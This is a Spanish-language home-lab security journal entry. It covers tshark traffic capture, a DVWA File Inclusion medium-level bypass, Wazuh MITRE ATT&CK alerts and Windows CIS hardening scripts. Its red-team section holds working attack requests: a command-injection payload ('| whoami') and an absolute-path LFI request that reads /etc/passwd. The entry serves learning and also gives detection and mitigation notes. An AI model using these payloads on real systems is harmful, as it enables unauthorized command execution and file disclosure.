# Día 20 — Network Sniffing: Wireshark + File Inclusion Medium + MITRE ATT&CK + CIS Hardening

**Fecha:** Abril 2026  
**MITRE:** T1040, T1190  
**DVWA:** File Inclusion (Medium)

---

## Teoría

### Network Sniffing — Wireshark/tshark
Wireshark es el analizador de paquetes más usado en ciberseguridad. Captura todo el tráfico de red en una interfaz y permite analizarlo en detalle. `tshark` es su versión CLI — más práctica para automatización y scripting. Los archivos `.pcap` son el formato estándar de captura — pueden abrirse en Wireshark GUI para análisis visual.

### File Inclusion Medium
En nivel Low el código incluye directamente el parámetro `page` sin filtros. En nivel Medium aplica `str_replace` para eliminar `../` y `http://` — bloqueando path traversal relativo y RFI. Sin embargo no valida rutas absolutas — una ruta como `/etc/passwd` bypasea completamente el filtro porque no contiene los patrones bloqueados.

---

## Red Team

### Sección 1 — Captura de tráfico con tshark

**Identificar interfaz de red:**
```bash
ip addr show | grep -E "inet|enp|eth|wlan" | grep -v "127.0.0.1"
```
Interfaz: `eth0` — IP: `192.168.1.132`

**Iniciar captura:**
```bash
sudo tshark -i eth0 -f "host 192.168.1.96" -w /tmp/captura_dia20.pcap
```

**En otra terminal — ejecutar ataque:**
```bash
curl -s "http://192.168.1.96:8080/vulnerabilities/exec/" \
  -b "PHPSESSID=<session>; security=medium" \
  -X POST \
  -d "ip=127.0.0.1| whoami&Submit=Submit"
```

**Análisis del pcap:**
```bash
sudo tshark -r /tmp/captura_dia20.pcap -Y "http" -T fields \
  -e http.request.method -e http.request.uri -e http.file_data 2>/dev/null | grep -v "^$"
```

**Output capturado:**
```
POST    /vulnerabilities/exec/
ip=127.0.0.1| whoami&Submit=Submit   ← payload en texto plano
```

El payload viaja en texto plano — un IDS con inspección de capa 7 detectaría `| whoami` en el parámetro `ip` como firma de Command Injection. El pcap es evidencia forense completa del ataque.

### Sección 2 — DVWA File Inclusion (Medium)

**Filtro del código fuente Medium:**
```php
$file = str_replace(array("http://", "https://"), "", $file);
$file = str_replace(array("../", "..\"), "", $file);
```

Bloquea `../` y `http://` — pero no rutas absolutas.

**Intentos bloqueados:**
```bash
?page=../../../etc/passwd       # bloqueado
?page=%2e%2e%2f...             # bloqueado
?page=....//....//             # bloqueado
```

**Bypass — ruta absoluta:**
```bash
curl -s "http://192.168.1.96:8080/vulnerabilities/fi/?page=/etc/passwd" \
  -b "PHPSESSID=<session>; security=medium" | grep -i "root\|www-data"
```
```
root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
```

**Diferencia LFI vs RFI:**

| | LFI | RFI |
|--|--|--|
| Origen | Archivo local en el servidor | Archivo remoto del atacante |
| Objetivo | Leer información | Ejecutar código |
| Peligrosidad | Alta | Crítica |
| Requisito PHP | Ninguno | `allow_url_include=On` |

---

## App MS Security — Filtros por Nivel Wazuh

Se agregaron filtros por nivel de alerta en la tabla de Wazuh — All, L7, L8, L9, L10, L12:

```jsx
const [wazuhFilter, setWazuhFilter] = useState(0)

{[0, 7, 8, 9, 10, 12].map(level => (
  <button key={level} className={`filter-btn ${wazuhFilter === level ? "active" : ""}`}
    onClick={() => setWazuhFilter(level)}>
    {level === 0 ? "All" : `L${level}`}
  </button>
))}
```

---

## Wazuh — MITRE ATT&CK

### Dashboard
El módulo MITRE ATT&CK de Wazuh mapea automáticamente alertas a tácticas y técnicas del framework. En las últimas 24 horas se registraron 1,740 eventos desde Windows-Marco.

**Top tactics:**
- Defense Evasion — 1,738 eventos
- Privilege Escalation — 859
- Persistence — 849
- Initial Access — 849
- Impact — 526

### Técnicas con alertas activas

| Técnica | Count | Origen |
|---------|-------|--------|
| T1078 — Valid Accounts | 849 | Logons de cuenta Marco |
| T1485 — Data Destruction | 339 | Claves de registro eliminadas (hardening) |
| T1112 — Modify Registry | 270+ | Cambios de registro del Día 18 |
| T1565.001 — Stored Data Manipulation | 187 | Modificación de valores de registro |
| T1484 — Domain Policy Modification | 10 | Cambios de auditpol |

**Técnicas con 0 alertas — pendientes del journal:**
- T1040 — Network Sniffing (hecho en Kali, sin agente)
- T1003 — OS Credential Dumping (Día 34)
- T1557 — Adversary-in-the-Middle (Día 21)
- T1110.002 — Password Cracking (Día 19 en Kali)

### Lección clave para SOC Analyst
El hardening del Día 18 aparece mapeado como Defense Evasion y Data Destruction — los mismos eventos que generaría un atacante. Sin contexto, un analista podría confundir hardening legítimo con un ataque real. En entornos corporativos se usan **change management tickets** para documentar cambios planificados y evitar falsos positivos.

---

## Wazuh — CIS Hardening

Score al inicio: **32%** (156 passed / 318 failed)

### Grupo 1 — Auditoría completa (26 subcategorías)

```powershell
$subcats = @(
    "Validación de credenciales", "Administración de grupos de aplicaciones",
    "Administración de grupos de seguridad", "Administración de cuentas de usuario",
    "Creación del proceso", "Bloqueo de cuenta", "Pertenencia a grupos",
    "Cerrar sesión", "Inicio de sesión", "Otros eventos de inicio y cierre de sesión",
    "Inicio de sesión especial", "Recurso compartido de archivos detallado",
    "Recurso compartido de archivos", "Otros eventos de acceso a objetos",
    "Almacenamiento extraíble", "Cambio en la directiva de auditoría",
    "Cambio de la directiva de autenticación", "Cambio de la directiva de autorización",
    "Cambio de la directiva del nivel de reglas de MPSSVC",
    "Otros eventos de cambio de directivas", "Uso de privilegio confidencial",
    "Controlador IPsec", "Otros eventos de sistema", "Cambio de estado de seguridad",
    "Extensión del sistema de seguridad", "Integridad del sistema"
)
foreach ($cat in $subcats) {
    auditpol /set /subcategory:"$cat" /success:enable /failure:enable 2>$null
}
```

### Grupo 2 — Login screen y privacidad

```powershell
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "DontDisplayLastUserName" -Value 1 -Type DWord -Force
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "InactivityTimeoutSecs" -Value 900 -Type DWord -Force
New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Personalization" -Force | Out-Null
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Personalization" -Name "NoLockScreenCamera" -Value 1 -Type DWord -Force
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Personalization" -Name "NoLockScreenSlideshow" -Value 1 -Type DWord -Force
```

Protege la pantalla de login — oculta el último usuario, bloquea a los 15 minutos, desactiva cámara y slideshow en lock screen.

### Grupo 3 — Firewall logging

```powershell
New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\WindowsFirewall\PrivateProfile\Logging" -Force | Out-Null
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\WindowsFirewall\PrivateProfile\Logging" -Name "LogFileSize" -Value 16384 -Type DWord -Force
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\WindowsFirewall\PrivateProfile\Logging" -Name "LogDroppedPackets" -Value 1 -Type DWord -Force
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\WindowsFirewall\PrivateProfile\Logging" -Name "LogSuccessfulConnections" -Value 1 -Type DWord -Force

New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\WindowsFirewall\PublicProfile\Logging" -Force | Out-Null
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\WindowsFirewall\PublicProfile\Logging" -Name "LogFileSize" -Value 16384 -Type DWord -Force
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\WindowsFirewall\PublicProfile\Logging" -Name "LogDroppedPackets" -Value 1 -Type DWord -Force
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\WindowsFirewall\PublicProfile\Logging" -Name "LogSuccessfulConnections" -Value 1 -Type DWord -Force
```

Registra paquetes bloqueados y conexiones exitosas en perfiles Private y Public.

### Grupo 4 — Telemetría y privacidad

```powershell
New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\LocationAndSensors" -Force | Out-Null
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\LocationAndSensors" -Name "DisableLocation" -Value 1 -Type DWord -Force
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name "DisableLockScreenAppNotifications" -Value 1 -Type DWord -Force
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name "BlockDomainPicturePassword" -Value 1 -Type DWord -Force
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name "AllowCrossDeviceClipboard" -Value 0 -Type DWord -Force
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name "UploadUserActivities" -Value 0 -Type DWord -Force
New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Dsh" -Force | Out-Null
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Dsh" -Name "AllowNewsAndInterests" -Value 0 -Type DWord -Force
```

Desactiva ubicación, notificaciones en lock screen, sincronización de portapapeles, actividades de usuario y widgets.

### Grupo 5 — Network security NTLM

```powershell
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "LmCompatibilityLevel" -Value 5 -Type DWord -Force
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\MSV1_0" -Name "NTLMMinClientSec" -Value 537395200 -Type DWord -Force
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\MSV1_0" -Name "NTLMMinServerSec" -Value 537395200 -Type DWord -Force
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "RestrictAnonymousSAM" -Value 1 -Type DWord -Force
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\MSV1_0" -Name "AuditReceivingNTLMTraffic" -Value 2 -Type DWord -Force
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\MSV1_0" -Name "RestrictSendingNTLMTraffic" -Value 1 -Type DWord -Force
```

Configura NTLMv2 como único protocolo de autenticación aceptado — rechaza LM y NTLMv1. Principalmente relevante en entornos empresariales con Active Directory.

---

## Blue Team

### Detección Network Sniffing
- El sniffing es pasivo — difícil de detectar directamente
- La defensa es HTTPS — cifra el contenido aunque los metadatos siguen visibles
- En redes switcheadas requiere ARP spoofing previo

### Detección File Inclusion
- Requests con rutas absolutas en parámetros GET (`/etc/passwd`, `/etc/shadow`)
- Un WAF con reglas de path traversal detectaría estos patrones

### Mitigación File Inclusion
- Usar whitelist — solo permitir valores conocidos
- Nunca incluir archivos basándose directamente en input del usuario
- Deshabilitar `allow_url_include` en PHP

---

## Conclusión

tshark capturó evidencia forense completa del ataque de Command Injection — el payload viaja en texto plano y es detectable por cualquier IDS. File Inclusion Medium demuestra que los filtros de lista negra son insuficientes — bloquear `../` no protege contra rutas absolutas. El módulo MITRE ATT&CK de Wazuh reveló que el hardening del Día 18 generó 1,740 eventos mapeados a tácticas de adversario — evidencia de que el contexto es crítico en un SOC. El hardening de hoy cubrió auditoría completa, login screen, firewall logging, telemetría y network security NTLM.
